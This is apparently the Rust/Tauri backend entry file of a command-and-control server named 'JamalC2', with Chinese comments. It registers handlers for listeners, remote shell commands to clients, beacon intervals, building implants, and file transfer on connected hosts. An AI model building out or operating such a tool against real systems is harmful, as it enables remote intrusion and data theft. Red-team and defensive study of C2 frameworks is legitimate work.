//! JamalC2 Control Server
//! Tauri 后端入口

mod state;
mod listener;
mod commands;
mod db;

use state::{AppState, SharedState};
use std::sync::Arc;

pub use commands::listener_cmd::*;
pub use commands::client_cmd::*;
pub use commands::builder_cmd::*;
pub use commands::files_cmd::*;

#[cfg_attr(mobile, tauri::mobile_entry_point)]
pub fn run() {
    // 创建全局状态
    let state: SharedState = Arc::new(AppState::new());
    
    tauri::Builder::default()
        .plugin(tauri_plugin_opener::init())
        .plugin(tauri_plugin_dialog::init())
        .plugin(tauri_plugin_fs::init())
        .manage(state)
        .invoke_handler(tauri::generate_handler![
            // 监听器命令
            get_listeners,
            create_listener,
            start_listener,
            stop_listener,
            delete_listener,
            // 客户端命令
            get_clients,
            send_shell_command,
            disconnect_client,
            get_shell_responses,
            set_beacon_interval,
            // Builder 命令
            build_implant,
            // 文件管理命令
            get_directory_listing,
            download_file,
            upload_file,
            delete_file,
            get_file_responses,
        ])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}

